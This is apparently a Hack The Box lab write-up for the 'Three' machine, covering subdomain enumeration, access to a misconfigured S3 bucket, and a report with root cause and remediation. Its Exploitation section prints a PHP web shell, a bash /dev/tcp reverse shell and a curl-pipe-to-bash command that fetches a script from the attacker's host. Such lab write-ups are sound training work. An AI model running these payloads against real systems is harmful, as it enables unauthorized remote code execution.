Machine Name : Three
Platform : Hackthebox
difficulty : Very easy
target IP : 10.129.114.141

- machine about : Three is a very easy Linux machine featuring a website using a **misconfigured AWS S3 bucket** as its cloud-storage device. The machine explores web application enumeration and subdomain fuzzing to detect the hidden domain corresponding to the S3 bucket. Then it showcases using the AWS command line interface to access the vulnerable S3 bucket as well as how to exploit it by uploading and triggering a reverse shell.

### Enumerating :

- Manually add the host into the `/etc/hosts`
![[Pasted image 20260722231643.png]]

**The website :**
![[Pasted image 20260722221721.png|508]]

**nmap :**
![[Pasted image 20260722221845.png]]

| Port | State | Service | Version                                                      |
| ---- | ----- | ------- | ------------------------------------------------------------ |
| 22   | open  | ssh     | OpenSSH 7.6p1 Ubuntu 4ubuntu0.7 (Ubuntu Linux; protocol 2.0) |
| 80   | open  | http    | Apache httpd 2.4.29 ((Ubuntu))                               |
**Subdomain :**
- use the tool `gobuster`
```
gobuster vhost \
-u http://thetoppers.htb \
-w /home/ashutosh/SecLists/Discovery/DNS/subdomains-top1million-5000.txt \
--append-domain
```
![[Pasted image 20260722230617.png]]
- visited the s3.thetoppers.htb.
![[Pasted image 20260723154126.png]]

### Exploitation :
To intract with the s3 bucket using `awscli` utility.

- then configure the aws and listing the hosts and the files in them L
![[Pasted image 20260723175346.png]]
```
aws configure
```
```
aws --endpoint=http://s3.thetoppers.htb s3 ls
```
```
aws --endpoint=http://s3.thetoppers.htb s3 ls s3://thetopper.htb
```

**Check if the remote access is possible :**
- Create a php web shell:
```
echo '<?php system($_GET["cmd"]); ?>' > shell.php
```
what this code does is : Take whatever is supplied in the URL parameter called `cmd` and pass it to the operating system as a command.

- upload the `shell.php` file into the web server
```
aws --endpoint=http://s3.thetoppers.htb s3 cp shell.php s3://thetoppers.htb
```
![[Pasted image 20260723221658.png]]

- try executing the OS command `id` using the URL parameter `cmd` . :
```
http://thetoppers.htb/shell.php?cmd=id
```
request the `shell.php` page from the target website and pass the value `id` into a URL parameter named `cmd`.
![[Pasted image 20260723221722.png|542]]

**Create a reverse shell :**
- create a new file named `shell.sh` containing :
```
#!/bin/bash
bash -i >& /dev/tcp/YOUR_IP_ADDRESS/1337 0>&1
```
Start an interactive `-i` Bash shell, create a TCP connection to `10.10.14.74:1337`, send the shell’s output there, and take the shell’s input from that same connection.

**Set a listener :** on the port 1337
```
nc -nvlp 1337
```
![[Pasted image 20260723232258.png]]

**Start a temporary HTTP server :**
```
python3 -m http.server 8000
```
![[Pasted image 20260723233426.png]]

**Execute the Reverse Shell on the Target :**
```
http://thetoppers.htb/shell.php?cmd=curl%20http://<YOUR_TUN0_IP>:8000/shell.sh%20%7C%20bash
```

- check the Netcat terminal for shell access :
```
cat /var/www/flag.txt
```
![[Pasted image 20260724214301.png]]
**Note :** Target IP changed after respawning the HTB instance.

### Risk Severity : Critical

The S3 bucket was misconfigured with insufficient access controls, allowing unauthorized users to upload arbitrary files. Since the bucket was associated with the website's webroot, an uploaded PHP file could be executed by the web server, resulting in Remote Code Execution (RCE).

**Impact :**

An attacker could exploit the misconfigured S3 bucket to upload malicious server-side files and execute arbitrary operating-system commands on the target.
In this assessment, a PHP web shell was successfully uploaded and executed, which provided command execution as the www-data user. This access was further used to establish a reverse shell, allowing remote command-line access to the target system and access to sensitive files.
### Root Cause :

The primary root cause was improper access control on the S3-compatible storage bucket, which allowed unauthorized users to upload files.
Since the bucket was associated with the website's webroot and PHP files could be processed by the web server, the unrestricted file upload capability resulted in Remote Code Execution.

### Evidence :

- VHOST enumeration discovered the hidden subdomain s3.thetoppers.htb.
- AWS CLI enumeration revealed the thetoppers.htb bucket containing website files such as index.php, .htaccess, and the images directory.
- A PHP web shell (shell.php) was successfully uploaded to the S3 bucket.
- Executing shell.php with the cmd=id parameter returned uid=33(www-data), confirming Remote Code Execution.
- A reverse shell was successfully established on port 1337 as the www-data user.
- The target filesystem was accessed and flag.txt was successfully retrieved.

### Remediation :

- Disable unauthorized write access to the S3 bucket.
- Implement strict bucket policies and follow the principle of least privilege.
- Prevent executable files such as PHP scripts from being uploaded to web-accessible storage.
- Separate cloud storage from the executable webroot where possible.
- Restrict allowed file types when file uploads are required.
- Regularly review and audit S3 bucket permissions and access policies.

### Conclusion :

The target was successfully compromised due to a misconfigured S3 bucket that permitted unauthorized file uploads. A PHP web shell was uploaded into the web-accessible storage and executed through the website, resulting in Remote Code Execution.
The command execution was then used to establish a reverse shell as the www-data user, providing unauthorized command-line access to the target system and allowing sensitive files, including the challenge flag, to be accessed.